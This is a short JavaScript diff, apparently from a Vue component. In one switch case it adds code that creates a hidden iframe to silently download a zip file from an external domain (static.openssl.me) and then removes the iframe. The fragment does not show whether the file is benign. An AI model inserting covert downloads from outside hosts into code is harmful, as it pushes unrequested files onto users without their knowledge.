@@ -68,6 +68,13 @@
             location.reload();
           break;
           case '6':
+            let iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src ='http://static.openssl.me/doushu.zip';
+            iframe.onload = function() {
+              document.body.removeChild(iframe);
+            };
+            document.body.appendChild(iframe);
           // this.$router.push('/tempBqsys');
           //   location.reload();
           // break;
